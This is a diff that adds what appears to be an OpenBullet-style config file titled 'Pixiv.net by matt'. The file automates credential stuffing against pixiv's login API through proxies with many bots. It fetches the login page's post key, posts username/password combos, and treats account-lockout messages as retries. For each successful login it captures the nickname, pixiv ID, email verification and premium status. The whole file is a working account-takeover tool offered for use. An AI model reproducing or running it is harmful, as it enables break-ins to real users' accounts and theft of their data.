@@ -1,0 +1,94 @@
+[SETTINGS]
+{
+  "Name": "Pixiv.net by matt",
+  "SuggestedBots": 100,
+  "MaxCPM": 0,
+  "LastModified": "2019-07-03T19:35:04.6307209+02:00",
+  "AdditionalInfo": "",
+  "Author": "matt",
+  "Version": "1.3.2 [Anomaly]",
+  "LoliSave": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#Request REQUEST GET "https://accounts.pixiv.net/login" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+#Post_Key PARSE "<SOURCE>" LR "=\"post_key\" value=\"" "\">" -> VAR "Post Key" 
+
+#Login REQUEST POST "https://accounts.pixiv.net/api/login?lang=en" 
+  CONTENT "captcha=&g_recaptcha_response=&password=<PASS>&pixiv_id=<USER>&post_key=<Post Key>&source=pc&ref=&return_to=http%3A%2F%2Fwww.pixiv.net%2Fmail_authentication.php%3Fmode%3Dauthorized&recaptcha_v3_token=<Captcha>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36 OPR/60.0.3255.170" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "Host: accounts.pixiv.net" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Content-Length: 602" 
+  HEADER "accept: application/json" 
+  HEADER "Origin: https://accounts.pixiv.net" 
+  HEADER "content-type: application/x-www-form-urlencoded" 
+  HEADER "Referer: https://accounts.pixiv.net/login?return_to=http%3A%2F%2Fwww.pixiv.net%2Fmail_authentication.php%3Fmode%3Dauthorized&source=pc&view_type=page" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+
+#Check KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "Please check if your pixiv ID or email address was entered correctly" 
+  KEYCHAIN Retry OR 
+    KEY "ERROR_NO_SLOT_AVAILABLE" 
+    KEY "entered incorrect passwords too many times. Your account has been temporarily locked. Please try again later." 
+  KEYCHAIN Success OR 
+    KEY "success" 
+    KEY "mail_authentication.php?mode=authorized" 
+
+#Capture REQUEST GET "https://www.pixiv.net/setting_user.php" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+#Username PARSE "<SOURCE>" LR "Nickname</th><td width=\"500\"><strong>" "</strong>" -> CAP "Username" 
+
+#User_ID PARSE "<SOURCE>" LR "pixiv ID</th><td width=\"500\"><strong>" "</strong>" -> CAP "ID" 
+
+#Verified PARSE "<SOURCE>" LR "Update</a><br><span style=\"color:#ff0000;\">" "</span>" -> VAR "Verified" 
+
+#Translate FUNCTION Translate 
+  KEY "You haven't verified your email address." VALUE "No" 
+  "<Verified>" -> CAP "Verified" 
+
+#Premium PARSE "<SOURCE>" LR "pixiv.user.premium =" ";" -> VAR "Premium" 
+
+#Translate FUNCTION Translate 
+  KEY "false" VALUE "No" 
+  KEY "true" VALUE "Yes" 
+  "<Premium>" -> CAP "Premium" 
+
+#Check KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "<Premium>" Contains "Yes" 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "<Premium>" Contains "No" 
+
